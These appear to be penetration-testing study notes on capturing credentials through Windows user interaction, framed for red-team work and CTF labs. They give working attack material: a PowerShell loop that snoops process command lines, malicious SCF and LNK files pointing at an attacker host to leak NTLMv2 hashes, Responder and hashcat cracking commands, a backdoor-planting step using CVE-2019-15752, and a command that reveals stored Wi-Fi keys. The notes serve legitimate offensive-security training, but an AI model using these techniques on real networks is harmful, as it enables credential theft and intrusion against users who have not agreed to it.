 High-Level Summary
This section focuses on leveraging user behavior and misconfigurations to elevate privileges or steal credentials. It's not necessarily about exploiting services — it's about sitting back, watching, planting traps, and collecting creds from users doing their thing.

These techniques come in clutch:

When you've exhausted privesc paths.

During post-exploitation, to gain lateral movement or report impact.

When working long-term engagements with persistence.

✅ Got This? Do That (Workflow)
🧩 Got This Situation	✅ Then Try This
Suspect user activity / can't find privesc	Monitor running processes for creds in command-line
Have access to shared folders	Drop SCF or LNK files to capture NTLMv2 hashes
Found Wireshark installed	Start capturing to sniff creds (FTP, HTTP Basic, etc.)
Docker Desktop pre-2.1.0.1 installed	Check for writable path to drop malicious exe (CVE-2019-15752)
Have user access but want elevated access	Trigger user interaction with malicious LNK file to capture creds
Have SMB share with write access	Plant malicious files and run Responder to capture hashes
Have access to PowerShell or command shell	Run process command monitoring loop
Doing long-term engagement	Let net-creds run in background or on pcap captures
🧨 Tactics Explained
🐍 1. Traffic Capture
If Wireshark is installed and npcap is unrestricted → capture FTP, HTTP Basic, etc.

You can use:

powershell
Copy
Edit
Start-Process Wireshark
Or from attack box:

bash
Copy
Edit
sudo tcpdump -i eth0 -w capture.pcap
📦 Tool: net-creds — parses live or recorded captures for creds.

👀 2. Monitor Process Command Lines
Users may unknowingly leak passwords in process command lines (common in backup scripts, net use commands, etc).

One-liner:

powershell
Copy
Edit
while($true){ $a=Get-WmiObject Win32_Process | Select CommandLine; Start-Sleep 2; $b=Get-WmiObject Win32_Process | Select CommandLine; Compare-Object -ReferenceObject $a -DifferenceObject $b }
Example find:

perl
Copy
Edit
net use T: \\sql02\backups /user:domain\sqlsvc My4dm1nP@s5w0Rd
🐳 3. Docker Desktop CVE-2019-15752
Path: C:\PROGRAMDATA\DockerDesktop\version-bin\

If BUILTIN\Users can write here, and file like docker-credential-wincred.exe is missing → drop your malicious payload.

It executes when:

Docker restarts

docker login is triggered by a user

🛠️ Drop a backdoor EXE, wait for it to fire.

📦 4. Malicious SCF File on Share
If a user browses a directory with a specially crafted .scf, their system initiates SMB auth → Responder snags the hash.

ini
Copy
Edit
[Shell]
Command=2
IconFile=\\<attacker_ip>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
Run Responder:

bash
Copy
Edit
sudo responder -I tun0 -wrf
Then crack it:

bash
Copy
Edit
hashcat -m 5600 hash.txt rockyou.txt
🧲 5. Malicious .lnk Files
Server 2019 blocks SCF-based leaks, so switch to .lnk (shortcut files).

PowerShell to generate:

powershell
Copy
Edit
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.Save()
Drop that .lnk on a share, wait for user to hover/click/open.

🧩 6. General User Interaction Attacks
Think long-term. Once creds or tokens are captured:

Use for lateral movement

Use for SQL Server pivoting

Use in report to show real-world impact of password hygiene or share misconfig

🔥 One-Liners to Remember
💻 Purpose	🔍 One-Liner
Process command-line snooping	`while($true){ $a=Get-WmiObject Win32_Process
Start Responder	sudo responder -I tun0 -wrf
Hashcat NetNTLMv2 crack	hashcat -m 5600 captured.hash rockyou.txt
Build malicious .lnk in PowerShell	See PowerShell script above
View Wi-Fi passwords	netsh wlan show profile <SSID> key=clear
💬 Final Thoughts
You're absolutely right — this feels like a HTB box or THM room, but it's extremely real-world relevant. Enterprises absolutely use Citrix, Docker Desktop, and shared drives — and users absolutely still leak creds in real deployments.

These techniques are:

Optional in lab-based escalation paths

Essential in actual red team or internal assessment reports

Sometimes, just catching one leaked admin hash after hours of enumeration is the win that changes the game.
